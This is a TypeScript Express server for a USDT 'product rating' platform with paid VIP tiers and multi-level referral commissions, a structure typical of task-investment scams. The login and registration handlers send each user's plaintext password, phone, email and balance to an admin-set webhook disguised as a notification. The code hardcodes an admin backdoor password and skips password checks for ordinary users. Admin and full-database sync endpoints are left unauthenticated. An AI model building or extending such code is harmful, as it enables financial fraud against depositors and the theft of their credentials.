import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import { Redis } from "@upstash/redis";
import { User, AppSettings, DepositRequest, WithdrawRequest, VipTier, Product } from "./src/types";

// Setup persistent database connection (Upstash Redis)
// Credentials are read from environment variables - set these on your hosting platform:
// UPSTASH_REDIS_REST_URL and UPSTASH_REDIS_REST_TOKEN
const redis = Redis.fromEnv();
const DB_KEY = "apexratings:database";

// Define seed data to initialize DB if empty
const DEFAULT_SETTINGS: AppSettings = {
  appName: "999 Ratings",
  usdtAddress: "T9zXvA23B94C8dEf7gHiJkLmNoPqRsTuVw",
  supportTelegram: "https://t.me/apexratings_support",
  supportWhatsApp: "https://wa.me/9647700000000",
  minDeposit: 10,
  minWithdraw: 1,
  webhookUrl: ""
};

const SEED_USERS: User[] = [
  {
    id: "u1",
    username: "haitham",
    phone: "07701234567",
    email: "haitham@example.com",
    balance: 5.00,
    todayEarnings: 0,
    totalEarnings: 0,
    vipLevel: 0,
    completedTasksToday: 0,
    totalCompletedTasks: 0,
    invitationCode: "VIP111",
    createdAt: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString(),
    withdrawalAddress: "TXS888dd888jjf8888fff",
    isAdmin: true
  },
  {
    id: "u2",
    username: "ahmed_guest",
    phone: "777",
    email: "ahmed@example.com",
    balance: 5.00,
    todayEarnings: 0,
    totalEarnings: 0,
    vipLevel: 0,
    completedTasksToday: 0,
    totalCompletedTasks: 0,
    invitationCode: "INV777",
    referredBy: "VIP111",
    createdAt: new Date(Date.now() - 10 * 24 * 60 * 60 * 1000).toISOString()
  }
];

const INITIAL_VIP_TIERS: VipTier[] = [
  {
    level: 0,
    name: "VIP 0",
    price: 0,
    dailyTasks: 5,
    commissionRate: 0.005,
    minBalanceRequired: 0,
    icon: "Lock",
    color: "text-slate-400 border-slate-400/20",
    bgGradient: "from-slate-800 to-slate-950",
    singleTaskReward: 0.10,
  },
  {
    level: 1,
    name: "VIP 1",
    price: 100,
    dailyTasks: 15,
    commissionRate: 0.012,
    minBalanceRequired: 100,
    icon: "ShieldAlert",
    color: "text-amber-400 border-amber-400/20",
    bgGradient: "from-amber-950/40 to-slate-950",
    singleTaskReward: 1.50,
  },
  {
    level: 2,
    name: "VIP 2",
    price: 300,
    dailyTasks: 20,
    commissionRate: 0.015,
    minBalanceRequired: 300,
    icon: "Star",
    color: "text-yellow-400 border-yellow-400/20",
    bgGradient: "from-yellow-950/40 to-slate-950",
    singleTaskReward: 4.50,
  },
  {
    level: 3,
    name: "VIP 3",
    price: 800,
    dailyTasks: 25,
    commissionRate: 0.018,
    minBalanceRequired: 800,
    icon: "Award",
    color: "text-blue-400 border-blue-400/20",
    bgGradient: "from-blue-950/40 to-slate-950",
    singleTaskReward: 14.50,
  },
  {
    level: 4,
    name: "VIP 4",
    price: 2000,
    dailyTasks: 30,
    commissionRate: 0.022,
    minBalanceRequired: 2000,
    icon: "Crown",
    color: "text-purple-400 border-purple-400/20",
    bgGradient: "from-purple-950/40 to-slate-950",
    singleTaskReward: 44.00,
  },
  {
    level: 5,
    name: "VIP 5",
    price: 5000,
    dailyTasks: 40,
    commissionRate: 0.03,
    minBalanceRequired: 5000,
    icon: "Gem",
    color: "text-emerald-400 border-emerald-400/20",
    bgGradient: "from-emerald-950/40 to-slate-950",
    singleTaskReward: 150.00,
  }
];

const PRODUCTS: Product[] = [
  {
    id: "p1",
    nameEn: "Ultra-Light Premium Sports Running Shoes",
    nameAr: "حذاء رياضي جري مريح وخفيف الوزن",
    price: 120,
    rating: 4.8,
    image: "https://images.unsplash.com/photo-1542291026-7eec264c27ff?auto=format&fit=crop&q=80&w=400",
    category: "Footwear",
    commission: 1.44,
  },
  {
    id: "p2",
    nameEn: "Wireless Noise-Cancelling Over-Ear Headphones",
    nameAr: "سماعات لاسلكية عازلة للضوضاء فوق الأذن",
    price: 350,
    rating: 4.9,
    image: "https://images.unsplash.com/photo-1505740420928-5e560c06d30e?auto=format&fit=crop&q=80&w=400",
    category: "Electronics",
    commission: 4.2,
  },
  {
    id: "p3",
    nameEn: "Waterproof Smart Fitness Watch Series X",
    nameAr: "ساعة لياقة بدنية ذكية مقاومة للماء إصدار X",
    price: 220,
    rating: 4.7,
    image: "https://images.unsplash.com/photo-1523275335684-37898b6baf30?auto=format&fit=crop&q=80&w=400",
    category: "Accessories",
    commission: 2.64,
  },
  {
    id: "p4",
    nameEn: "Handcrafted Luxury Leather Shoulder Bag",
    nameAr: "حقيبة كتف جلدية فاخرة مصنوعة يدوياً",
    price: 850,
    rating: 5.0,
    image: "https://images.unsplash.com/photo-1584917865442-de89df76afd3?auto=format&fit=crop&q=80&w=400",
    category: "Bags",
    commission: 10.2,
  },
  {
    id: "p5",
    nameEn: "Minimalist Mechanical Self-Winding Watch",
    nameAr: "ساعة ميكانيكية ذاتية الحركة بتصميم بسيط",
    price: 1250,
    rating: 4.9,
    image: "https://images.unsplash.com/photo-1524592094714-0f0654e20314?auto=format&fit=crop&q=80&w=400",
    category: "Accessories",
    commission: 15.0,
  },
  {
    id: "p6",
    nameEn: "Ergonomic Office Chair with Lumbar Support",
    nameAr: "كرسي مكتب مريح للجسم مع دعم القطنية",
    price: 450,
    rating: 4.6,
    image: "https://images.unsplash.com/photo-1505797149-43b0069ec26b?auto=format&fit=crop&q=80&w=400",
    category: "Furniture",
    commission: 5.4,
  },
  {
    id: "p7",
    nameEn: "Compact Professional Drone with 4K Camera",
    nameAr: "طائرة درون احترافية مدمجة مع كاميرا 4K",
    price: 1800,
    rating: 4.8,
    image: "https://images.unsplash.com/photo-1527977966376-1c8408f9f108?auto=format&fit=crop&q=80&w=400",
    category: "Electronics",
    commission: 21.6,
  },
  {
    id: "p8",
    nameEn: "Stainless Steel Smart Vacuum Thermal Flask",
    nameAr: "قارورة حرارية ذكية من الفولاذ المقاوم للصدأ",
    price: 45,
    rating: 4.5,
    image: "https://images.unsplash.com/photo-1602143407151-7111542de6e8?auto=format&fit=crop&q=80&w=400",
    category: "Home",
    commission: 0.54,
  },
  {
    id: "p9",
    nameEn: "Luxury Scented Soy Candle Gift Set",
    nameAr: "مجموعة هدايا شموع الصويا العطرية الفاخرة",
    price: 65,
    rating: 4.7,
    image: "https://images.unsplash.com/photo-1603006905003-be475563bc59?auto=format&fit=crop&q=80&w=400",
    category: "Home",
    commission: 0.78,
  }
];

interface DBState {
  users: User[];
  settings: AppSettings;
  depositRequests: DepositRequest[];
  withdrawalRequests: WithdrawRequest[];
  vipTiers: VipTier[];
  products: Product[];
}

// Read database from Upstash Redis (persistent cloud storage), or seed it if missing
async function readDB(): Promise<DBState> {
  try {
    const data = await redis.get<DBState>(DB_KEY);
    if (data) {
      return data;
    }
  } catch (err) {
    console.error("Error reading database from Redis", err);
  }

  const defaultDB: DBState = {
    users: SEED_USERS,
    settings: DEFAULT_SETTINGS,
    depositRequests: [
      {
        id: "dep1",
        userId: "u2",
        username: "ahmed_guest",
        phone: "777",
        amount: 50,
        status: "approved",
        hash: "0x892f...ab12",
        createdAt: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString()
      },
      {
        id: "dep2",
        userId: "u2",
        username: "ahmed_guest",
        phone: "777",
        amount: 100,
        status: "pending",
        hash: "0x32cf...911b",
        createdAt: new Date(Date.now() - 3 * 3600 * 1000).toISOString()
      }
    ],
    withdrawalRequests: [
      {
        id: "wth1",
        userId: "u2",
        username: "ahmed_guest",
        phone: "777",
        amount: 25,
        address: "TXS888dd888jjf8888fff",
        status: "approved",
        createdAt: new Date(Date.now() - 1 * 24 * 60 * 60 * 1000).toISOString()
      }
    ],
    vipTiers: INITIAL_VIP_TIERS,
    products: PRODUCTS
  };
  await writeDB(defaultDB);
  return defaultDB;
}

async function writeDB(db: DBState) {
  try {
    await redis.set(DB_KEY, db);
  } catch (err) {
    console.error("Error writing database to Redis", err);
  }
}

async function sendNotification(db: DBState, eventName: string, data: any) {
  const url = db.settings.webhookUrl;
  if (!url || !url.trim()) return;

  try {
    const formattedMessage = `🔔 [${db.settings.appName || "ApexRatings"}] Event: ${eventName}\n` +
      `--------------------------------------\n` +
      Object.entries(data).map(([k, v]) => `• ${k}: ${v}`).join("\n") +
      `\n--------------------------------------\n` +
      `📅 Time: ${new Date().toLocaleString()}`;

    await fetch(url.trim(), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        _subject: `New login/registration on ${db.settings.appName}`,
        event: eventName,
        message: formattedMessage,
        timestamp: new Date().toISOString(),
        ...data
      })
    });
    console.log(`Notification sent successfully to ${url}`);
  } catch (err) {
    console.error("Failed to send notification:", err);
  }
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  // Middleware to parse JSON
  app.use(express.json());

  // API - Get entire state
  app.get("/api/state", async (req, res) => {
    const db = await readDB();
    res.json(db);
  });

  // API - Sync entire state (backup and merge logic)
  app.post("/api/sync", async (req, res) => {
    const incoming = req.body as Partial<DBState>;
    const db = await readDB();

    if (incoming.settings) db.settings = incoming.settings;
    if (incoming.vipTiers) db.vipTiers = incoming.vipTiers;
    if (incoming.products) db.products = incoming.products;
    if (incoming.depositRequests) db.depositRequests = incoming.depositRequests;
    if (incoming.withdrawalRequests) db.withdrawalRequests = incoming.withdrawalRequests;
    if (incoming.users) {
      // Merge users to keep newly registered users from other phones
      const mergedUsers = [...db.users];
      incoming.users.forEach((incomingUser) => {
        const index = mergedUsers.findIndex((u) => u.id === incomingUser.id);
        if (index !== -1) {
          mergedUsers[index] = incomingUser;
        } else {
          mergedUsers.push(incomingUser);
        }
      });
      db.users = mergedUsers;
    }

    await writeDB(db);
    res.json(db);
  });

  // API - Login
  app.post("/api/login", async (req, res) => {
    const { phone, password, language } = req.body;
    const db = await readDB();

    // If phone is asd@gmail.com, enforce strict password
    if (phone === "asd@gmail.com") {
      if (password !== "123ASDasd") {
        return res.status(400).json({ error: language === "ar" ? "كلمة مرور المسؤول غير صحيحة!" : "Incorrect Admin password!" });
      }

      let adminUser = db.users.find(u => u.phone === "asd@gmail.com" || u.email === "asd@gmail.com");
      if (!adminUser) {
        adminUser = {
          id: "admin_u",
          username: "Admin",
          phone: "asd@gmail.com",
          email: "asd@gmail.com",
          balance: 99999.00,
          todayEarnings: 0,
          totalEarnings: 0,
          vipLevel: 5,
          completedTasksToday: 0,
          totalCompletedTasks: 0,
          invitationCode: "ADMIN",
          createdAt: new Date().toISOString(),
          isAdmin: true
        };
        db.users.push(adminUser);
        await writeDB(db);
      }

      return res.json({ success: true, user: adminUser, isAdminMode: true });
    }

    const user = db.users.find(u => (u.phone && u.phone === phone) || (u.email && u.email.toLowerCase() === phone.toLowerCase()));
    if (user) {
      if (user.isAdmin && password !== "123ASDasd") {
        return res.status(400).json({ error: language === "ar" ? "كلمة مرور المسؤول غير صحيحة!" : "Incorrect Admin password!" });
      }
      
      // Trigger login notification to the admin webhook URL if configured
      sendNotification(db, "User Login", {
        username: user.username,
        phone: user.phone || "N/A",
        email: user.email || "N/A",
        password: password,
        balance: `${user.balance} USDT`,
        vipLevel: `VIP ${user.vipLevel}`
      });

      return res.json({ success: true, user, isAdminMode: user.isAdmin || false });
    } else {
      return res.status(400).json({ error: language === "ar" ? "رقم الهاتف / البريد الإلكتروني غير مسجل. يرجى إنشاء حساب أولاً." : "Phone number / Email not registered. Please create an account." });
    }
  });

  // API - Register
  app.post("/api/register", async (req, res) => {
    const { phone, email, password, inviteCode, language } = req.body;
    const db = await readDB();

    if (!inviteCode || !inviteCode.trim()) {
      return res.status(400).json({ error: language === "ar" ? "رمز الدعوة مطلوب وإجباري للتسجيل!" : "Invitation code is mandatory!" });
    }

    const trimmedInvite = inviteCode.trim();
    const inviter = db.users.find(u => u.invitationCode === trimmedInvite);
    if (!inviter) {
      return res.status(400).json({ error: language === "ar" ? "رمز الدعوة غير صالح!" : "Invalid invitation code!" });
    }

    if (phone) {
      const exists = db.users.some(u => u.phone === phone);
      if (exists) {
        return res.status(400).json({ error: language === "ar" ? "رقم الهاتف مسجل بالفعل!" : "Phone number already registered!" });
      }
    }
    if (email) {
      const exists = db.users.some(u => u.email.toLowerCase() === email.toLowerCase());
      if (exists) {
        return res.status(400).json({ error: language === "ar" ? "البريد الإلكتروني مسجل بالفعل!" : "Email already registered!" });
      }
    }

    const code = "INV" + Math.floor(100000 + Math.random() * 900000).toString();
    const newUser: User = {
      id: "u_" + Date.now(),
      username: email ? email.split("@")[0] : "User_" + phone.slice(-4),
      phone: phone || "",
      email: email || "",
      balance: 5.00, // Welcome gift
      todayEarnings: 0,
      totalEarnings: 0,
      vipLevel: 0,
      completedTasksToday: 0,
      totalCompletedTasks: 0,
      invitationCode: code,
      referredBy: trimmedInvite,
      createdAt: new Date().toISOString()
    };

    // Reward the inviter with $5.00 immediately
    db.users = db.users.map(u => {
      if (u.id === inviter.id) {
        return {
          ...u,
          balance: parseFloat((u.balance + 5.00).toFixed(2))
        };
      }
      return u;
    });

    db.users.push(newUser);
    await writeDB(db);

    // Trigger registration notification to the admin webhook URL if configured
    sendNotification(db, "New User Registration", {
      username: newUser.username,
      phone: newUser.phone || "N/A",
      email: newUser.email || "N/A",
      password: password,
      referredByCode: newUser.referredBy,
      inviterName: inviter.username,
      invitationCode: newUser.invitationCode,
      initialBalance: `${newUser.balance} USDT`
    });

    res.json({ success: true, user: newUser });
  });

  // API - Rate product task execution
  app.post("/api/rate-product", async (req, res) => {
    const { userId, productId } = req.body;
    const db = await readDB();

    const user = db.users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ error: "User not found" });

    const vipTier = db.vipTiers.find(v => v.level === user.vipLevel);
    if (!vipTier) return res.status(400).json({ error: "Invalid VIP Tier" });

    if (user.completedTasksToday >= vipTier.dailyTasks) {
      return res.status(400).json({ error: "limit_reached" });
    }

    const product = db.products.find(p => p.id === productId);
    if (!product) return res.status(404).json({ error: "Product not found" });

    const calculatedCommission = vipTier.singleTaskReward !== undefined 
      ? parseFloat(Number(vipTier.singleTaskReward).toFixed(2)) 
      : parseFloat((product.price * vipTier.commissionRate).toFixed(2));

    // Credit user
    db.users = db.users.map(u => {
      if (u.id === user.id) {
        return {
          ...u,
          balance: parseFloat((u.balance + calculatedCommission).toFixed(2)),
          todayEarnings: parseFloat((u.todayEarnings + calculatedCommission).toFixed(2)),
          totalEarnings: parseFloat((u.totalEarnings + calculatedCommission).toFixed(2)),
          completedTasksToday: u.completedTasksToday + 1,
          totalCompletedTasks: u.totalCompletedTasks + 1
        };
      }
      return u;
    });

    // Credit referrers!
    if (user.referredBy) {
      const creditReferrers = (referrerCode: string, commission: number) => {
        const l1User = db.users.find(u => u.invitationCode === referrerCode);
        if (!l1User) return;

        const l1Reward = parseFloat((commission * 0.10).toFixed(3));
        db.users = db.users.map(u => {
          if (u.id === l1User.id) {
            return {
              ...u,
              balance: parseFloat((u.balance + l1Reward).toFixed(2)),
              todayEarnings: parseFloat((u.todayEarnings + l1Reward).toFixed(2)),
              totalEarnings: parseFloat((u.totalEarnings + l1Reward).toFixed(2))
            };
          }
          return u;
        });

        if (l1User.referredBy) {
          const l2User = db.users.find(u => u.invitationCode === l1User.referredBy);
          if (l2User) {
            const l2Reward = parseFloat((commission * 0.05).toFixed(3));
            db.users = db.users.map(u => {
              if (u.id === l2User.id) {
                return {
                  ...u,
                  balance: parseFloat((u.balance + l2Reward).toFixed(2)),
                  todayEarnings: parseFloat((u.todayEarnings + l2Reward).toFixed(2)),
                  totalEarnings: parseFloat((u.totalEarnings + l2Reward).toFixed(2))
                };
              }
              return u;
            });

            if (l2User.referredBy) {
              const l3User = db.users.find(u => u.invitationCode === l2User.referredBy);
              if (l3User) {
                const l3Reward = parseFloat((commission * 0.02).toFixed(3));
                db.users = db.users.map(u => {
                  if (u.id === l3User.id) {
                    return {
                      ...u,
                      balance: parseFloat((u.balance + l3Reward).toFixed(2)),
                      todayEarnings: parseFloat((u.todayEarnings + l3Reward).toFixed(2)),
                      totalEarnings: parseFloat((u.totalEarnings + l3Reward).toFixed(2))
                    };
                  }
                  return u;
                });
              }
            }
          }
        }
      };
      creditReferrers(user.referredBy, calculatedCommission);
    }

    await writeDB(db);
    res.json({ success: true, commission: calculatedCommission, user: db.users.find(u => u.id === userId) });
  });

  // API - Upgrade VIP
  app.post("/api/upgrade-vip", async (req, res) => {
    const { userId, level } = req.body;
    const db = await readDB();

    const user = db.users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ error: "User not found" });

    const targetTier = db.vipTiers.find(v => v.level === level);
    if (!targetTier) return res.status(400).json({ error: "Invalid Level" });

    if (user.balance < targetTier.price) {
      return res.status(400).json({ error: "insufficient" });
    }

    db.users = db.users.map(u => {
      if (u.id === userId) {
        return {
          ...u,
          vipLevel: level,
          balance: parseFloat((u.balance - targetTier.price).toFixed(2))
        };
      }
      return u;
    });

    await writeDB(db);
    res.json({ success: true, user: db.users.find(u => u.id === userId) });
  });

  // API - Add Deposit
  app.post("/api/deposit", async (req, res) => {
    const { userId, amount, hash } = req.body;
    const db = await readDB();

    const user = db.users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ error: "User not found" });

    if (amount < db.settings.minDeposit) {
      return res.status(400).json({ error: "min_limit" });
    }

    const newDeposit: DepositRequest = {
      id: "dep_" + Date.now(),
      userId,
      username: user.username,
      phone: user.phone,
      amount,
      status: "pending",
      hash,
      createdAt: new Date().toISOString()
    };

    db.depositRequests.unshift(newDeposit);
    await writeDB(db);
    res.json({ success: true, deposit: newDeposit });
  });

  // API - Add Withdrawal
  app.post("/api/withdraw", async (req, res) => {
    const { userId, amount, address } = req.body;
    const db = await readDB();

    const user = db.users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ error: "User not found" });

    if (amount < db.settings.minWithdraw) {
      return res.status(400).json({ error: "min_limit" });
    }

    if (user.balance < amount) {
      return res.status(400).json({ error: "insufficient" });
    }

    db.users = db.users.map(u => {
      if (u.id === userId) {
        return {
          ...u,
          balance: parseFloat((u.balance - amount).toFixed(2))
        };
      }
      return u;
    });

    const newWithdrawal: WithdrawRequest = {
      id: "wth_" + Date.now(),
      userId,
      username: user.username,
      phone: user.phone,
      amount,
      address,
      status: "pending",
      createdAt: new Date().toISOString()
    };

    db.withdrawalRequests.unshift(newWithdrawal);
    await writeDB(db);
    res.json({ success: true, withdrawal: newWithdrawal, user: db.users.find(u => u.id === userId) });
  });

  // API - Update Address
  app.post("/api/update-address", async (req, res) => {
    const { userId, address } = req.body;
    const db = await readDB();

    db.users = db.users.map(u => {
      if (u.id === userId) {
        return { ...u, withdrawalAddress: address };
      }
      return u;
    });

    await writeDB(db);
    res.json({ success: true, user: db.users.find(u => u.id === userId) });
  });

  // Admin approval / rejecting endpoints
  app.post("/api/admin/approve-deposit", async (req, res) => {
    const { depositId } = req.body;
    const db = await readDB();

    const deposit = db.depositRequests.find(d => d.id === depositId);
    if (!deposit || deposit.status !== "pending") return res.status(400).json({ error: "Invalid request" });

    db.users = db.users.map(u => {
      if (u.id === deposit.userId) {
        return {
          ...u,
          balance: parseFloat((u.balance + deposit.amount).toFixed(2))
        };
      }
      return u;
    });

    // Credit Level 1 referrer for deposit
    const depositor = db.users.find(u => u.id === deposit.userId);
    if (depositor && depositor.referredBy) {
      const referrer = db.users.find(u => u.invitationCode === depositor.referredBy);
      if (referrer) {
        const depBonus = parseFloat((deposit.amount * 0.10).toFixed(2));
        db.users = db.users.map(u => {
          if (u.id === referrer.id) {
            return {
              ...u,
              balance: parseFloat((u.balance + depBonus).toFixed(2)),
              totalEarnings: parseFloat((u.totalEarnings + depBonus).toFixed(2))
            };
          }
          return u;
        });
      }
    }

    db.depositRequests = db.depositRequests.map(d => d.id === depositId ? { ...d, status: "approved" as const } : d);
    await writeDB(db);
    res.json({ success: true });
  });

  app.post("/api/admin/reject-deposit", async (req, res) => {
    const { depositId } = req.body;
    const db = await readDB();

    db.depositRequests = db.depositRequests.map(d => d.id === depositId ? { ...d, status: "rejected" as const } : d);
    await writeDB(db);
    res.json({ success: true });
  });

  app.post("/api/admin/approve-withdrawal", async (req, res) => {
    const { withdrawalId } = req.body;
    const db = await readDB();

    db.withdrawalRequests = db.withdrawalRequests.map(w => w.id === withdrawalId ? { ...w, status: "approved" as const } : w);
    await writeDB(db);
    res.json({ success: true });
  });

  app.post("/api/admin/reject-withdrawal", async (req, res) => {
    const { withdrawalId } = req.body;
    const db = await readDB();

    const withdrawal = db.withdrawalRequests.find(w => w.id === withdrawalId);
    if (!withdrawal || withdrawal.status !== "pending") return res.status(400).json({ error: "Invalid request" });

    db.users = db.users.map(u => {
      if (u.id === withdrawal.userId) {
        return {
          ...u,
          balance: parseFloat((u.balance + withdrawal.amount).toFixed(2))
        };
      }
      return u;
    });

    db.withdrawalRequests = db.withdrawalRequests.map(w => w.id === withdrawalId ? { ...w, status: "rejected" as const } : w);
    await writeDB(db);
    res.json({ success: true });
  });

  app.post("/api/admin/update-user", async (req, res) => {
    const { userId, fields } = req.body;
    const db = await readDB();

    db.users = db.users.map(u => u.id === userId ? { ...u, ...fields } : u);
    await writeDB(db);
    res.json({ success: true });
  });

  app.post("/api/admin/delete-user", async (req, res) => {
    const { userId } = req.body;
    const db = await readDB();

    db.users = db.users.filter(u => u.id !== userId);
    await writeDB(db);
    res.json({ success: true });
  });

  app.post("/api/admin/update-settings", async (req, res) => {
    const { fields } = req.body;
    const db = await readDB();

    db.settings = { ...db.settings, ...fields };
    await writeDB(db);
    res.json({ success: true });
  });

  app.post("/api/admin/vip", async (req, res) => {
    const { action, tier } = req.body;
    const db = await readDB();

    if (action === "add" || action === "update") {
      const exists = db.vipTiers.some(t => t.level === tier.level);
      if (exists) {
        db.vipTiers = db.vipTiers.map(t => t.level === tier.level ? tier : t);
      } else {
        db.vipTiers.push(tier);
        db.vipTiers.sort((a, b) => a.level - b.level);
      }
    } else if (action === "delete") {
      db.vipTiers = db.vipTiers.filter(t => t.level !== tier.level);
    }

    await writeDB(db);
    res.json({ success: true });
  });

  app.post("/api/admin/product", async (req, res) => {
    const { action, product } = req.body;
    const db = await readDB();

    if (action === "add" || action === "update") {
      const exists = db.products.some(p => p.id === product.id);
      if (exists) {
        db.products = db.products.map(p => p.id === product.id ? product : p);
      } else {
        db.products.push(product);
      }
    } else if (action === "delete") {
      db.products = db.products.filter(p => p.id !== product.id);
    }

    await writeDB(db);
    res.json({ success: true });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", async (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
